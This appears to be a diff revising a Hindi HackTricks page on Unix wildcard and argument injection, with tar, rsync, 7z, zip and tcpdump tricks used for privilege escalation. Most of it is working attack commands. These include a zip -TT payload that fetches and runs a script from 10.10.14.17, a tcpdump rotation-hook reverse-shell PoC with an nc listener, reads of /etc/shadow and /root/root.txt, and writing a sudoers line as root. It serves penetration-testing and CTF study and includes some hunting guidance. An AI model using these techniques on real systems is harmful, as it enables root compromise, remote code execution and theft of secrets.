@@ -1,63 +1,63 @@
-# Wildcards Spare Tricks
+# Wildcards के अतिरिक्त Tricks
 
-{{#include ../../banners/hacktricks-training.md}}
-
-> Wildcard (aka *glob*) **argument injection** तब होता है जब कोई privileged script `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसे Unix binary को unquoted wildcard जैसे `*` के साथ चलाता है।
-> चूंकि shell binary को execute करने से **पहले** wildcard को expand करता है, इसलिए working directory में files बनाने वाला attacker ऐसे filenames तैयार कर सकता है जो `-` से शुरू हों, ताकि उन्हें **data के बजाय options** के रूप में interpret किया जाए और इस तरह arbitrary flags या यहां तक कि commands को प्रभावी रूप से smuggle किया जा सके।
-> यह page 2023-2025 के लिए सबसे उपयोगी primitives, recent research और modern detections को एकत्र करता है।
+> Wildcard (aka *glob*) **argument injection** तब होता है जब कोई privileged script `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसे Unix binary को बिना quotes वाले wildcard जैसे `*` के साथ चलाता है।
+> चूंकि shell binary को execute करने से **पहले** wildcard को expand करता है, इसलिए working directory में files create कर सकने वाला attacker ऐसे filenames बना सकता है जो `-` से शुरू हों, ताकि उन्हें **data के बजाय options** के रूप में interpret किया जाए। इस तरह arbitrary flags या यहां तक कि commands को प्रभावी रूप से smuggle किया जा सकता है।<sup>[[6]](#references)</sup>
+> यह page 2023-2025 के सबसे उपयोगी primitives, recent research और modern detections एकत्र करता है।
 
 ## chown / chmod
 
-आप `--reference` flag का दुरुपयोग करके **किसी arbitrary file के owner/group या permission bits को copy** कर सकते हैं:
+जब कोई option-जैसा filename wildcard से expand होता है, तब `--reference` flag का दुरुपयोग करके आप **किसी reference file से owner/group या permission bits copy** कर सकते हैं।<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 # attacker-controlled directory
-touch "--reference=/root/secret``file"   # ← filename becomes an argument
+touch -- .drf.php
+chmod 777 -- .drf.php
+touch -- "--reference=.drf.php"   # ← filename becomes an argument
 ```
 जब root बाद में कुछ इस तरह execute करता है:
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-`--reference=/root/secret``file` inject किया जाता है, जिससे *सभी matching files* `/root/secret``file` की ownership/permissions inherit कर लेते हैं।
+विस्तारित `--reference=.drf.php` explicit owner/mode को override करता है, जिससे matching files `.drf.php` से metadata inherit करती हैं (और, ऊपर दिए गए setup के साथ, attacker द्वारा writable बन जाती हैं)।<sup>[[6]](#references)</sup>
 
-*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack)।  
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack)।<sup>[[7]](#references)</sup>  
 विवरण के लिए classic DefenseCode paper भी देखें।<sup>[[6]](#references)</sup>
 
 ---
 
 ## tar
 
-### GNU tar (Linux, *BSD, busybox-full)
+### GNU tar
 
-**checkpoint** feature का दुरुपयोग करके arbitrary commands execute करें:
+GNU tar के **checkpoint** feature और checkpoint actions का दुरुपयोग करके arbitrary commands execute करें।<sup>[[10]](#references)</sup>
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
 chmod +x shell.sh
-touch "--checkpoint=1"
-touch "--checkpoint-action=exec=sh shell.sh"
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
-Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` को root के रूप में execute किया जाता है।
+जब root, उदाहरण के लिए, `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` को root के रूप में execute किया जाता है।<sup>[[10]](#references)</sup>
 
-### bsdtar / macOS 14+
+### bsdtar / macOS compressor override संबंधी सावधानी
 
-हाल के macOS में default `tar` (`libarchive` पर आधारित) `--checkpoint` को implement नहीं करता, लेकिन आप अभी भी **--use-compress-program** flag के माध्यम से code-execution प्राप्त कर सकते हैं, जो आपको एक external compressor निर्दिष्ट करने की अनुमति देता है।
+हाल के macOS पर default `tar` (`libarchive` पर आधारित) GNU tar का `--checkpoint` interface प्रदान *नहीं* करता, लेकिन bsdtar किसी external compressor को चुनने के लिए **--use-compress-program** को document करता है।<sup>[[11]](#references)</sup>
 ```bash
 # macOS example
-touch "--use-compress-program=/bin/sh"
+touch -- "--use-compress-program=sh"
 ```
-जब कोई privileged script `tar -cf backup.tar *` चलाती है, तो `/bin/sh` शुरू हो जाएगा।
+जब कोई privileged script `tar -cf backup.tar *` चलाता है, तो यह victim के `PATH` के माध्यम से `sh` को चुनता है और bsdtar उसे compressor के रूप में शुरू करता है।<sup>[[11]](#references)</sup> यह option injection को सिद्ध करता है, लेकिन अपने-आप में यह reliable arbitrary-command primitive नहीं है: wildcard से बनाई गई filename में `/` नहीं हो सकता, और bsdtar archive data देता है, न कि attacker द्वारा चुना गया shell command। Code execution के लिए अतिरिक्त रूप से `PATH` के माध्यम से resolved होने वाला controllable executable या ऐसा अन्य argument channel आवश्यक है, जो किसी उपयोगी program का नाम दे सके।
 
 ---
 
 ## rsync
 
-`rsync` आपको `-e` या `--rsync-path` से शुरू होने वाले command-line flags के माध्यम से remote shell या remote binary को override करने देता है:
+`rsync` आपको `-e` और `--rsync-path` जैसे command-line flags के माध्यम से remote shell या remote binary को override करने देता है।<sup>[[12]](#references)</sup>
 ```bash
 # attacker-controlled directory
-touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
+touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-यदि root बाद में directory को `rsync -az * backup:/srv/` के साथ archive करता है, तो injected flag remote side पर आपका shell शुरू कर देता है।
+यदि root बाद में `rsync -az * backup:/srv/` से directory को archive करता है, तो injected flag remote-shell mechanism के माध्यम से एक shell चला सकता है।<sup>[[7]](#references)[[12]](#references)</sup>
 
 *PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode)।
 
@@ -65,7 +65,7 @@ touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 
 ## 7-Zip / 7z / 7za
 
-जब privileged script wildcard के आगे `--` लगाकर option parsing को रोकने की *रक्षात्मक* कोशिश भी करती है, तब भी 7-Zip format filename के आगे `@` लगाकर **file list files** को support करता है। इसे symlink के साथ मिलाकर आप *arbitrary files exfiltrate* कर सकते हैं:
+जब privileged script wildcard के आगे `--` लगाकर *defensively* option parsing को रोकता है, तब भी 7-Zip CLI filename के आगे `@` लगाकर **file list files** स्वीकार करता है। इसे symlink के साथ मिलाने पर आप *arbitrary files exfiltrate* कर सकते हैं।<sup>[[13]](#references)</sup>
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
@@ -76,17 +76,17 @@ touch @root.txt                  # tells 7z to use root.txt as file list
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-7-Zip `root.txt` (→ `/etc/shadow`) को file list के रूप में पढ़ने का प्रयास करेगा और बाहर निकल जाएगा, **जिससे contents को stderr पर print किया जाएगा**।
+7-Zip `root.txt` (→ `/etc/shadow`) को file list के रूप में पढ़ने का प्रयास करेगा और रुक जाएगा, **जिससे contents stderr पर print होंगे**।<sup>[[13]](#references)</sup>
 
-यह `-- *` के बावजूद काम करता है, क्योंकि 7-Zip CLI positional inputs के रूप में regular filenames और `@listfiles` दोनों को स्पष्ट रूप से स्वीकार करता है, इसलिए `@root.txt` जैसा literal filename अभी भी विशेष रूप से treat किया जाता है।
+यह `-- *` के बावजूद काम करता है, क्योंकि 7-Zip CLI positional inputs के रूप में regular filenames और `@listfiles` दोनों को स्पष्ट रूप से स्वीकार करता है, इसलिए `@root.txt` जैसा literal filename अब भी specially treat किया जाता है।<sup>[[13]](#references)</sup>
 
 ---
 
 ## zip
 
-जब कोई application user-controlled filenames को `zip` में पास करता है (या तो wildcard के माध्यम से या `--` के बिना names enumerate करके), तब दो बहुत practical primitives उपलब्ध होते हैं।<sup>[[2]](#references)[[3]](#references)</sup>
+जब कोई application user-controlled filenames को `zip` में pass करता है (या तो wildcard के जरिए या `--` के बिना names enumerate करके), तब दो बहुत practical primitives उपलब्ध होते हैं।<sup>[[2]](#references)[[3]](#references)</sup>
 
-- RCE via test hook: `-T` “test archive” सक्षम करता है और `-TT <cmd>` tester को arbitrary program से replace करता है (long form: `--unzip-command <cmd>`). यदि आप ऐसे filenames inject कर सकते हैं जो `-` से शुरू होते हैं, तो flags को अलग-अलग filenames में split करें, ताकि short-options parsing काम कर सके:
+- RCE via test hook: `-T` “test archive” enable करता है और `-TT <cmd>` tester को arbitrary program से replace करता है (long form: `--unzip-command <cmd>`). यदि आप ऐसे filenames inject कर सकते हैं जो `-` से शुरू होते हैं, तो short-options parsing के काम करने के लिए flags को अलग-अलग filenames में split करें।<sup>[[2]](#references)[[3]](#references)</sup>
 ```bash
 # Attacker-controlled filenames (e.g., in an upload directory)
 # 1) A file literally named: -T
@@ -96,43 +96,42 @@ touch @root.txt                  # tells 7z to use root.txt as file list
 # zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
 नोट्स
-- `'-T -TT <cmd>'` जैसे single filename का उपयोग करने का प्रयास न करें — short options को प्रत्येक character के अनुसार parse किया जाता है और यह विफल हो जाएगा। दिखाए गए अनुसार अलग-अलग tokens का उपयोग करें।
-- यदि app filenames से slashes हटा देता है, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` के साथ locally save करें, फिर execute करें।
-- यह समझने के लिए कि आपके tokens कैसे consume किए जा रहे हैं, parsing को `-sc` (processed argv दिखाता है) या `-h2` (अधिक help) से debug कर सकते हैं।
+- `'-T -TT <cmd>'` जैसे एकल filename का उपयोग करने का प्रयास न करें — short options को प्रति character parse किया जाता है और यह विफल हो जाएगा। दिखाए गए अनुसार अलग-अलग tokens का उपयोग करें।<sup>[[3]](#references)</sup>
+- यदि app filenames से slashes हटा देता है, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` के साथ locally save करें, फिर execute करें।<sup>[[3]](#references)</sup>
+- यह समझने के लिए कि आपके tokens कैसे consume किए जा रहे हैं, `-sc` (processed argv दिखाता है) या `-h2` (अधिक help) के साथ parsing debug कर सकते हैं।<sup>[[3]](#references)</sup>
 
-Example (zip 3.0 पर local behavior):
+Example (zip 3.0 पर local behavior)।<sup>[[3]](#references)</sup>
 ```bash
 zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
 zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
 ```
-- Data exfil/leak: यदि web layer `zip` stdout/stderr को echo करती है (naive wrappers में आम), तो `--help` जैसे injected flags या bad options से होने वाली failures HTTP response में दिखाई देंगी, जिससे command-line injection की पुष्टि होगी और payload tuning में सहायता मिलेगी।
+- Data exfil/leak: यदि web layer `zip` के stdout/stderr को echo करती है (naive wrappers में सामान्य), तो `--help` जैसे injected flags या bad options से होने वाली failures HTTP response में दिखाई देंगी, जिससे command-line injection की पुष्टि होगी और payload tuning में सहायता मिलेगी।<sup>[[3]](#references)</sup>
 
 ---
 
-## Wildcard injection के प्रति vulnerable अतिरिक्त binaries (2023-2025 quick list)
+## Additional option-injection candidates
 
-निम्न commands का modern CTFs और वास्तविक environments में दुरुपयोग किया गया है। Payload हमेशा एक *filename* के रूप में writable directory के अंदर बनाया जाता है, जिसे बाद में wildcard के साथ process किया जाएगा:
+जब कोई privileged wrapper writable directory को wildcard के साथ expand करता है, तो इन documented option hooks की जांच करना उपयोगी है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
 | Binary | Flag to abuse | Effect |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | File contents पढ़ें |
-| `flock` | `-c <cmd>` | Command execute करें |
-| `git`   | `-c core.sshCommand=<cmd>` | git over SSH के माध्यम से command execution |
-| `scp`   | `-S <cmd>` | ssh के बजाय arbitrary program spawn करें |
+| `flock` | `-c <cmd>` | किसी command string को shell में pass करता है |
+| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push के लिए SSH के बजाय `<cmd>` का उपयोग करता है |
+| `scp`   | `-S <program>` | किसी alternate SSH-compatible connection program का उपयोग करता है |
 
-ये primitives *tar/rsync/zip* classics की तुलना में कम common हैं, लेकिन hunting के दौरान इन्हें check करना उपयोगी है।
+ये primitives सामान्य *tar/rsync/zip* classics से आगे उपयोगी checks हैं।
 
 ---
 
-## Vulnerable wrappers और jobs की hunting
+## Hunting vulnerable wrappers and jobs
 
-हाल के case studies से पता चला है कि wildcard/argv injection अब केवल **cron + tar** की समस्या नहीं है।<sup>[[5]](#references)</sup> यही bug class निम्न में भी लगातार दिखाई देती है:
+Recent case studies और detection guidance से पता चलता है कि wildcard/argv injection अब केवल **cron + tar** की समस्या नहीं है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> यही bug class निम्नलिखित में भी बार-बार दिखाई देती है:
 
-- web features जो attacker-controlled upload directories से "download everything as zip/tar" करते हैं
-- vendor/appliance debug shells जो attacker-controlled filename/filter fields के साथ **tcpdump** wrapper expose करते हैं
-- backup या rotation jobs जो writable directories पर `tar`, `rsync`, `7z`, `zip`, `chown`, या `chmod` call करते हैं
+- web features जो attacker-controlled upload directories से "download everything as zip/tar" करती हैं
+- vendor/appliance debug shells जो attacker-controlled filename/filter fields के साथ **tcpdump** wrapper expose करती हैं
+- backup या rotation jobs जो writable directories पर `tar`, `rsync`, `7z`, `zip`, `chown`, या `chmod` चलाती हैं
 
-Useful triage commands:
+उपयोगी triage commands (`pspy` invocation अपने documented process/file-event और interval flags का उपयोग करता है)।<sup>[[14]](#references)</sup>
 ```bash
 # Hunt for interesting binaries fed with globs or positional user data
 rg -n --hidden --follow \
@@ -148,22 +147,22 @@ rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
 ```
 त्वरित heuristics:
 
-- `-- *` कई GNU tools के लिए एक अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` को अलग से parse किया जाता है।
-- `zip` के लिए ऐसे wrappers खोजें जो user-controlled filenames को सीधे enumerate करते हों; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करती है।
-- `tcpdump` के लिए उन wrappers पर विशेष ध्यान दें जो आपको **output file names**, **rotation settings**, या **capture-file replay** arguments को control करने देते हैं।
+- `-- *` कई GNU tools के लिए एक अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` को अलग से parse किया जाता है।<sup>[[13]](#references)</sup>
+- `zip` के लिए ऐसे wrappers खोजें जो user-controlled filenames को सीधे enumerate करते हों; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करता है।<sup>[[2]](#references)[[3]](#references)</sup>
+- `tcpdump` के लिए उन wrappers पर विशेष ध्यान दें जो आपको **output file names**, **rotation settings**, या **capture-file replay** arguments नियंत्रित करने देते हैं।<sup>[[18]](#references)</sup>
 
 ---
 
-## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के जरिए RCE
+## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के ज़रिए RCE
 
-जब कोई restricted shell या vendor wrapper user-controlled fields (जैसे `"file name"` parameter) को strict quoting/validation के बिना concatenate करके `tcpdump` command line बनाता है, तो आप अतिरिक्त `tcpdump` flags को smuggle कर सकते हैं। `-G` (time-based rotation), `-W` (files की संख्या की limit), और `-z <cmd>` (post-rotate command) का combination, tcpdump चलाने वाले user के रूप में arbitrary command execution कराता है (appliances पर अक्सर root)।<sup>[[1]](#references)[[4]](#references)</sup>
+जब कोई restricted shell या vendor wrapper user-controlled fields (जैसे `"फ़ाइल नाम"` parameter) को strict quoting/validation के बिना जोड़कर `tcpdump` command line बनाता है, तो आप अतिरिक्त `tcpdump` flags छिपाकर भेज सकते हैं। `-G` (time-based rotation), `-W` (files की संख्या सीमित करना), और `-z <cmd>` (post-rotate command) का combination उस user के रूप में arbitrary command execution कराता है जो tcpdump चला रहा है (अक्सर appliances पर root)।<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>
 
-Preconditions:
+पूर्व-शर्तें:
 
-- आप `tcpdump` को pass किए गए `argv` को influence कर सकते हैं (जैसे `/debug/tcpdump --filter=... --file-name=<HERE>` जैसे wrapper के जरिए)।
-- Wrapper file name field में spaces या `-` से शुरू होने वाले tokens को sanitize नहीं करता।
+- आप `tcpdump` को दिए जाने वाले `argv` को प्रभावित कर सकते हैं (जैसे `/debug/tcpdump --filter=... --file-name=<HERE>` जैसा wrapper)।<sup>[[4]](#references)[[18]](#references)</sup>
+- Wrapper फ़ाइल नाम field में spaces या `-`-prefixed tokens को sanitize नहीं करता।<sup>[[4]](#references)</sup>
 
-Classic PoC (एक writable path से reverse shell script execute करता है):
+Classic PoC (writable path से reverse shell script execute करता है)।<sup>[[4]](#references)[[18]](#references)</sup>
 ```sh
 # Reverse shell payload saved on the device (e.g., USB, tmpfs)
 cat > /mnt/disk1_1/rce.sh <<'EOF'
@@ -181,48 +180,48 @@ nc -6 -lvnp 4444 &
 # Then send any packet that matches the BPF to force a rotation
 printf x | nc -u -6 [victim_ipv6] 1234
 ```
-Details:
+विवरण:
 
-- `-G 1 -W 1` पहले matching packet के बाद तुरंत rotate को force करता है।
-- `-z <cmd>` प्रत्येक rotation के लिए post-rotate command एक बार चलाता है। कई builds `<cmd> <savefile>` execute करते हैं। यदि `<cmd>` कोई script/interpreter है, तो सुनिश्चित करें कि argument handling आपके payload से मेल खाता हो।
+- `-G 1` हर सेकंड rotate करता है, और `-W 1` एक rotated file के बाद रुक जाता है; rotation से पहले capture को matching packet प्राप्त होना आवश्यक है।<sup>[[18]](#references)</sup>
+- `-z <cmd>` प्रत्येक rotation के बाद post-rotate command को एक बार चलाता है और बंद किए गए savefile का path argument के रूप में पास करता है; सुनिश्चित करें कि script/interpreter का argument handling आपके payload से मेल खाता हो।<sup>[[18]](#references)</sup>
 
-No-removable-media variants:
+Removable media के बिना variants:
 
-- यदि आपके पास files लिखने के लिए कोई अन्य primitive है (जैसे एक अलग command wrapper जो output redirection की अनुमति देता हो), तो अपनी script को किसी ज्ञात path में रखें और `-z /bin/sh /path/script.sh` या `-z /path/script.sh` trigger करें, जो platform semantics पर निर्भर करता है।
-- कुछ vendor wrappers attacker-controllable locations पर rotate करते हैं। यदि आप rotated path को प्रभावित कर सकते हैं (symlink/directory traversal), तो आप `-z` को ऐसे content को execute करने के लिए steer कर सकते हैं जिसे आप पूरी तरह control करते हैं, और इसके लिए external media की आवश्यकता नहीं होती।
+- यदि आपके पास files लिखने के लिए कोई अन्य primitive है (जैसे, एक अलग command wrapper जो output redirection की अनुमति देता है), तो अपनी script को किसी ज्ञात path पर रखें और `-z /path/script.sh` trigger करें; आवश्यकता होने पर script स्वयं `/bin/sh` invoke करे।<sup>[[18]](#references)</sup>
+- यदि कोई vendor wrapper आपको rotated path चुनने देता है, तो उस path control का audit केवल ऐसे post-rotate command के संयोजन में करें जो उसके savefile argument को interpret करता हो; केवल path control से file contents execute नहीं होते।<sup>[[18]](#references)</sup>
 
 ---
 
-## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root
+## sudoers: wildcards/additional args वाले tcpdump → arbitrary write/read और root
 
-बहुत सामान्य sudoers anti-pattern:<sup>[[3]](#references)</sup>
+Example sudoers anti-pattern:<sup>[[3]](#references)</sup>
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
 ```
-समस्याएँ
-- `*` glob और permissive patterns केवल पहले `-w` argument को सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; अंतिम वाला प्रभावी होता है।
-- यह rule अन्य options को सीमित नहीं करता, इसलिए `-Z`, `-r`, `-V` आदि allowed हैं।
+यह rule tcpdump के documented parser के अंतर्गत कई options उपलब्ध छोड़ता है:<sup>[[3]](#references)[[18]](#references)</sup>
+- `*` glob और permissive patterns केवल पहले `-w` argument को सीमित करते हैं। `tcpdump` कई `-w` options स्वीकार करता है; अंतिम वाला प्रभावी होता है।<sup>[[3]](#references)[[18]](#references)</sup>
+- rule अन्य options को pin नहीं करता, इसलिए `-Z`, `-r`, `-V` आदि allowed हैं।<sup>[[3]](#references)[[18]](#references)</sup>
 
-Primitives
-- दूसरे `-w` के साथ destination path को override करें (पहला केवल sudoers को संतुष्ट करता है):
+Relevant primitives नीचे documented हैं।<sup>[[3]](#references)[[18]](#references)</sup>
+- दूसरे `-w` से destination path override करें (पहला केवल sudoers को satisfy करता है)।<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ \
 -w /dev/shm/out.pcap \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- constrained tree से बाहर निकलने के लिए पहले `-w` के अंदर Path traversal:
+- सीमित tree से बाहर निकलने के लिए पहले `-w` के अंदर Path traversal।<sup>[[3]](#references)</sup>
 ```bash
 sudo tcpdump -c10 \
 -w/var/cache/captures/a/../../../../dev/shm/out \
 -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- `-Z root` के साथ आउटपुट का स्वामित्व बाध्य करें (कहीं भी root-owned files बनाता है):
+- `-Z root` के साथ output ownership force करें (कहीं भी root-owned files बनाता है)।<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -w /dev/shm/root-owned \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- `-r` के माध्यम से crafted PCAP को replay करके arbitrary-content write (जैसे, sudoers line डालना):
+- `-r` के माध्यम से crafted PCAP को replay करके arbitrary-content write (जैसे, sudoers line लिखना)।<sup>[[3]](#references)[[18]](#references)</sup>
 
 <details>
 <summary>ऐसा PCAP बनाएं जिसमें exact ASCII payload हो और उसे root के रूप में लिखें</summary>
@@ -237,9 +236,7 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-</details>
-
-- `-V <file>` के साथ arbitrary file read/secret leak (savefiles की सूची के रूप में interpret करता है)। Error diagnostics अक्सर lines को echo करते हैं, जिससे content leak हो सकता है:
+- `-V <file>` के साथ Arbitrary file read/secret leak (savefiles की सूची के रूप में interprets करता है)। Error diagnostics अक्सर lines को echo करते हैं, जिससे content leak हो सकता है।<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 -w /tmp/dummy \
@@ -247,13 +244,24 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 ```
 ---
 
-## संदर्भ
+## References
 
 - [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
 - [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
 - [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
 - [4] [FiberGateway GR241AG - पूर्ण Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
-- [5] [Elastic - Wildcard Injection के माध्यम से संभावित Shell का पता चला](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
-- [6] [भविष्य की ओर लौटें: Unix Wildcards अनियंत्रित हो गए (DefenseCode)](https://www.exploit-db.com/papers/33930)
-
+- [5] [Elastic - Wildcard Injection के माध्यम से Potential Shell का पता चला](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
+- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
+- [7] [wildpwn](https://github.com/localh0t/wildpwn)
+- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
+- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
+- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
+- [11] [bsdtar(1) manual](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
+- [12] [rsync(1) manual](https://download.samba.org/pub/rsync/rsync.1)
+- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
+- [14] [pspy](https://github.com/DominicBreuker/pspy)
+- [15] [flock(1) manual](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
+- [16] [Git configuration documentation](https://git-scm.com/docs/git-config)
+- [17] [OpenBSD `scp` manual](https://man.openbsd.org/scp)
+- [18] [tcpdump(8) manual](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
 {{#include ../../banners/hacktricks-training.md}}
